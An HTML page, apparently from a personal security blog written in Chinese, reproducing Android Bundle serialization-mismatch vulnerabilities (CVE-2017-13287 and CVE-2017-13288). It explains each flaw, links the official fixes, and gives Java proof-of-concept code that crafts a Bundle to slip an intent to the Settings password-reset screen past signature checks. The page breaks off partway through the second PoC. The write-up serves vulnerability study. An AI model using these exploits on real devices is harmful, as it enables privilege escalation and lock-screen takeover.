@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/pig_128x128.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/pig_32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/pig_16x16.ico">
+  <link rel="mask-icon" href="/images/pig_128x128.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rotoro Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"slient2009.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="参考相关文章，完成一下Android的几个反序列化漏洞的PoC代码。原理是相似的，只是出现序列化缺陷的类有不同，构造方法也有细微的区别。 CEV-2017-13311和CVE-2017-13315只能以后有时间再补上了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="几个Android反序列化漏洞复现">
+<meta property="og:url" content="http://slient2009.github.io/2021/08/02/Android-CVEs-of-Parcel/index.html">
+<meta property="og:site_name" content="Slient2009">
+<meta property="og:description" content="参考相关文章，完成一下Android的几个反序列化漏洞的PoC代码。原理是相似的，只是出现序列化缺陷的类有不同，构造方法也有细微的区别。 CEV-2017-13311和CVE-2017-13315只能以后有时间再补上了。">
+<meta property="og:locale" content="ja_JP">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912114212610.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912160551139.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912202251144.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912162607553.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912163413323.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912202325193.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913162036354.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913164445607.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913164553310.png">
+<meta property="article:published_time" content="2021-08-02T04:00:01.000Z">
+<meta property="article:modified_time" content="2021-12-10T15:50:39.000Z">
+<meta property="article:author" content="slient2009">
+<meta property="article:tag" content="Android">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912114212610.png">
+
+<link rel="canonical" href="http://slient2009.github.io/2021/08/02/Android-CVEs-of-Parcel/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'ja'
+  };
+</script>
+
+  <title>几个Android反序列化漏洞复现 | Slient2009</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="ナビゲーションバーの切り替え">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Slient2009</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">All I need is Twin Island Milk</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>ホーム</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>プロフィール</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>タグ<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>アーカイブ<span class="badge">12</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="ja">
+    <link itemprop="mainEntityOfPage" href="http://slient2009.github.io/2021/08/02/Android-CVEs-of-Parcel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/round_tiger.png">
+      <meta itemprop="name" content="slient2009">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Slient2009">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          几个Android反序列化漏洞复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">投稿日</span>
+
+              <time title="作成日：2021-08-02 00:00:01" itemprop="dateCreated datePublished" datetime="2021-08-02T00:00:01-04:00">2021-08-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">編集日</span>
+                <time title="修正日：2021-12-10 10:50:39" itemprop="dateModified" datetime="2021-12-10T10:50:39-05:00">2021-12-10</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="閲覧数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">閲覧数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>参考相关文章，完成一下Android的几个反序列化漏洞的PoC代码。原理是相似的，只是出现序列化缺陷的类有不同，构造方法也有细微的区别。</p>
+<p>CEV-2017-13311和CVE-2017-13315只能以后有时间再补上了。</p>
+<span id="more"></span>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2364#toc-2">Bundle风水——Android序列化与反序列化不匹配漏洞详解 - 先知社区 (aliyun.com)</a></p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Parcelable对象</th>
+<th>公布时间</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b87c968e5a41a1a09166199bf54eee12608f3900">CVE-2017-0806</a></td>
+<td>GateKeeperResponse</td>
+<td>2017.10</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/47ebfaa2196aaf4fbeeec34f1a1c5be415cf041b^!/#F0">CVE-2017-13286</a></td>
+<td>OutputConfiguration</td>
+<td>2018.04</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a">CVE-2017-13287</a></td>
+<td>VerifyCredentialResponse</td>
+<td>2018.04</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b796cd32a45bcc0763c50cc1a0cc8236153dcea3">CVE-2017-13288</a></td>
+<td>PeriodicAdvertisingReport</td>
+<td>2018.04</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/5a3d2708cd2289a4882927c0e2cb0d3c21a99c02">CVE-2017-13289</a></td>
+<td>ParcelableRttResults</td>
+<td>2018.04</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/2950276f61220e00749f8e24e0c773928fefaed8">CVE-2017-13311</a></td>
+<td>SparseMappingTable</td>
+<td>2018.05</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/35bb911d4493ea94d4896cc42690cab0d4dbb78f">CVE-2017-13315</a></td>
+<td>DcParamObject</td>
+<td>2018.05</td>
+</tr>
+</tbody></table>
+<h1 id="CVE-2017-13286"><a href="#CVE-2017-13286" class="headerlink" title="CVE-2017-13286"></a>CVE-2017-13286</h1><p>详细分析在之前的一篇文章：<a href="https://slient2009.github.io/2021/08/31/CVE-2017-13286/">CVE-2017-13286 复现 | Slient2009</a></p>
+<h1 id="CVE-2017-13287"><a href="#CVE-2017-13287" class="headerlink" title="CVE-2017-13287"></a>CVE-2017-13287</h1><p>对应的类是<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/a4e80ee2cdae43fb92d3560924bce5e33cdb9c4c/core/java/com/android/internal/widget/VerifyCredentialResponse.java">core/java/com/android/internal/widget/VerifyCredentialResponse.java</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912114212610.png" alt="image-20210912114212610"></p>
+<p>当<code>mResponseCode=RESPONSE_OK=0</code>时，一定会从<code>Parcel</code>中再读取一个<code>int</code>视作<code>mPayload</code>的长度，但是在序列化过程中，只会在<code>mPayload!=null</code>才会写出<code>PayloadSize</code>和<code>mPayload</code>。<br>如果构造<code>ResponseCode=0</code>和<code>size=0</code>，在反序列化过程中，会读入这两个值，并且使得<code>Payload=null</code>。但是在序列化过程中，只会写出<code>ResponseCode=0</code>。由此，导致了内存在序列化前后的不一致。<br>具体构造方法如下：</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912160551139.png" alt="image-20210912160551139"></p>
+<ol>
+<li>构造一个<code>VerifyCredentialResponse</code>，<code>responseCode=0</code>且<code>payloadSize=0</code>，但是不会读入<code>payloadByteArray</code>。构造一个<code>ByteArray</code>对象，<code>key=0xC11171</code>（末尾的<code>0</code>表示String的阶段），<code>value</code>中内含一个恶意<code>intent</code>。后加一个<code>String</code>对象用于填充。</li>
+<li>第二次序列化时，<code>VerifyCredentialResponse</code>不会写出<code>payloadSize=0</code>，但是在第二次反序列化时会读入<code>payloadSize=0x0C</code>。<br>因此在反序列化过程中，后续的<code>0xC111</code>作为<code>payload</code>被读入。需要注意的是，<code>payload</code>的读入具体由<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/a4e80ee2cdae43fb92d3560924bce5e33cdb9c4c/core/jni/android_os_Parcel.cpp">android_os_Parcel_readByteArray()</a>完成，<code>0xC=12</code>将被视作<code>byte array</code>的长度，<code>0x111</code>是具体内容。<br>因此，后续的<code>0x7</code>被视作第二个键的长度，接下来的<code>0</code>、<code>D</code>以及<code>L(原bytes的长度)</code>被解析为键名，<code>0x6</code>表示键值是个<code>Long</code>，<code>LONG</code>是具体的数值。<br>接着，<code>intent</code>就暴露出来，从而绕过了<code>intent</code>的签名检查。</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// core.java.android.os.Parcel.java中使用的native函数，在core.jni.android_os_Parcel.cpp中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> jboolean <span class="title">android_os_Parcel_readByteArray</span><span class="params">(JNIEnv* env, jclass clazz, jlong nativePtr, jobject dest, jint destLen)</span></span>&#123;</span><br><span class="line">    jboolean ret = JNI_FALSE;</span><br><span class="line">    Parcel* parcel = <span class="keyword">reinterpret_cast</span>&lt;Parcel*&gt;(nativePtr);</span><br><span class="line">    <span class="keyword">if</span> (parcel == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int32_t</span> len = parcel-&gt;<span class="built_in">readInt32</span>();<span class="comment">//先读length</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt;= <span class="number">0</span> &amp;&amp; len &lt;= (<span class="keyword">int32_t</span>)parcel-&gt;<span class="built_in">dataAvail</span>() &amp;&amp; len == destLen) &#123;<span class="comment">//还要校验两次声明的长度是否一致，否则抛出异常</span></span><br><span class="line">        jbyte* ar = (jbyte*)env-&gt;<span class="built_in">GetPrimitiveArrayCritical</span>((jarray)dest, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ar) &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">void</span>* data = parcel-&gt;<span class="built_in">readInplace</span>(len);</span><br><span class="line">            <span class="built_in">memcpy</span>(ar, data, len);</span><br><span class="line">            env-&gt;<span class="built_in">ReleasePrimitiveArrayCritical</span>((jarray)dest, ar, <span class="number">0</span>);</span><br><span class="line">            ret = JNI_TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">poc2017_13287</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Bundle retBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    Parcel bundleData = Parcel.obtain();</span><br><span class="line">    Parcel craftData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//craftData是传递的Bundle载荷，这里手动构造载荷内容，然后补上Bundle格式头</span></span><br><span class="line">    craftData.writeInt(<span class="number">3</span>); <span class="comment">// 总共传递3个对象,三个key-value对</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个Key为VerifyCredentialResponse，它将用来引起内存错位从而绕过检查</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;object1&quot;</span>);<span class="comment">//是这个object的名字,似乎长度有些要求</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE = 4</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.internal.widget.VerifyCredentialResponse&quot;</span>); <span class="comment">// value类型VerifyCredentialResponse </span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);<span class="comment">//responseCode=0 RESPONSE_ERROR=-1 RESPONSE_OK=0 RESPONSE_RETRY=1 这里需要OK使得去尝试读PayloadSize字段</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);<span class="comment">//PayloadSize=0 读入payload为null，但是不会写出payloadSize=0，从这里开始造成错位</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">12</span>);<span class="comment">//第二个key的长度，后来被解析为PayloadSize</span></span><br><span class="line">    craftData.writeInt(<span class="number">12</span>);<span class="comment">//第二个key的值，后来被解析为payloadBytesLength，参看Parcel的native readByteArray(),发现byteArray的第一个int表示了byteArray的长度，且PayloadSize应该等于ByteArrayLength，否则要抛异常</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">7</span>);<span class="comment">//</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);<span class="comment">//这个0用于表示string的结束</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">13</span>);<span class="comment">//VAL_BYTEARRAY = 13,后来被解析为第二个key的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来构造ByteArray，或者说内含Intent的ByteArray</span></span><br><span class="line">    craftData.writeInt(-<span class="number">1</span>); <span class="comment">// 这个位置用于存放ByteArray部分的长度，先占位，构造完之后再来写入</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayStartPos = craftData.dataPosition();  <span class="comment">// 记录ByteArray部分在craftData中起始位置，因为接下来要构造ByteArray了</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">6</span>);</span><br><span class="line">    craftData.writeLong(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    craftData.writeString(AccountManager.KEY_INTENT);<span class="comment">// 第二个object是个intent</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">//intent也是一个parcel</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// value类型为intent，将被按照intent格式解析</span></span><br><span class="line">    craftData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action 这里开始是intent的属性</span></span><br><span class="line">    Uri.writeToParcel(craftData, <span class="keyword">null</span>); <span class="comment">// Uri</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Type</span></span><br><span class="line">    craftData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Package</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//SourceBounds</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Categories</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Selector</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//ClipData</span></span><br><span class="line">    craftData.writeInt(-<span class="number">2</span>); <span class="comment">//ContentUserHint</span></span><br><span class="line">    craftData.writeBundle(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ByteArrayEndPos = craftData.dataPosition(); <span class="comment">// byteArray到此结束，记录结束位置</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayLength = ByteArrayEndPos - ByteArrayStartPos; <span class="comment">// 计算ByteArray数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayStartPos - <span class="number">4</span>);  <span class="comment">// 把读写指针位移动到ByteArray部分起始位-4,即-1所在的位置</span></span><br><span class="line">    craftData.writeInt(ByteArrayLength);<span class="comment">// 在ByteArray部分前写入ByteArray这段数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayEndPos);<span class="comment">// 将读写指针移动到最后</span></span><br><span class="line">    Log.i(TAG, <span class="string">&quot;the length of INTENT = &quot;</span> + ByteArrayLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里做个用于填充的键值对</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PaddingK&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PaddingV&quot;</span>); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> length  = craftData.dataSize();</span><br><span class="line">    bundleData.writeInt(length); <span class="comment">//所有数据的长度</span></span><br><span class="line">    bundleData.writeInt(<span class="number">0x4c444E42</span>); <span class="comment">//Bundle魔数</span></span><br><span class="line">    bundleData.appendFrom(craftData, <span class="number">0</span>, length); <span class="comment">//</span></span><br><span class="line">    bundleData.setDataPosition(<span class="number">0</span>);<span class="comment">//移动Parcel的读写指针位置到开头</span></span><br><span class="line">    retBundle.readFromParcel(bundleData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retBundle;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复措施：<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a^!/">Diff - 09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a^! - platform/frameworks/base - Git at Google (googlesource.com)</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912202251144.png" alt="image-20210912202251144"></p>
+<h1 id="CVE-2017-13288"><a href="#CVE-2017-13288" class="headerlink" title="CVE-2017-13288"></a>CVE-2017-13288</h1><p>对应的类是<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-8.0.0_r1/core/java/android/bluetooth/le/PeriodicAdvertisingReport.java">core/java/android/bluetooth/le/PeriodicAdvertisingReport.java</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912162607553.png" alt="image-20210912162607553"></p>
+<p>这个漏洞类似于CVE-2017-13286，相当于都是多写了一个<code>int</code>，构造方法如图所示：</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912163413323.png" alt="image-20210912163413323"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">poc2017_13288</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Bundle retBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    Parcel bundleData = Parcel.obtain();</span><br><span class="line">    Parcel craftData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//craftData是传递的Bundle载荷，这里手动构造载荷内容，然后补上Bundle格式头</span></span><br><span class="line">    craftData.writeInt(<span class="number">3</span>); <span class="comment">// 总共传递3个对象,三个key-value对</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个Key为VerifyCredentialResponse，它将用来引起内存错位从而绕过检查</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PARPAR&quot;</span>);<span class="comment">//是这个object的名字,似乎长度有些要求</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE = 4</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.bluetooth.le.PeriodicAdvertisingReport&quot;</span>); <span class="comment">// value类型PeriodicAdvertisingReport</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//syncHandle</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//txPower INT to LONG</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//rssi</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//dataStatus</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//isData</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//BytesLength</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//Bytes</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//第二个Key的长度，后来被解析为payloadSize</span></span><br><span class="line">    craftData.writeInt(<span class="number">6</span>);<span class="comment">//第二个Key的值，后来被接卸为payloadByteArray</span></span><br><span class="line">    craftData.writeInt(<span class="number">13</span>);<span class="comment">//VAL_BYTEARRAY = 13,后来被解析为第二个key的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来构造ByteArray，或者说内含Intent的ByteArray</span></span><br><span class="line">    craftData.writeInt(-<span class="number">1</span>); <span class="comment">// 这个位置用于存放ByteArray部分的长度，先占位，构造完之后再来写入</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayStartPos = craftData.dataPosition();  <span class="comment">// 记录ByteArray部分在craftData中起始位置，因为接下来要构造ByteArray了</span></span><br><span class="line"></span><br><span class="line">    craftData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">//intent也是一个parcel</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// value类型为intent，将被按照intent格式解析</span></span><br><span class="line">    craftData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action 这里开始是intent的属性</span></span><br><span class="line">    Uri.writeToParcel(craftData, <span class="keyword">null</span>); <span class="comment">// Uri</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Type</span></span><br><span class="line">    craftData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// 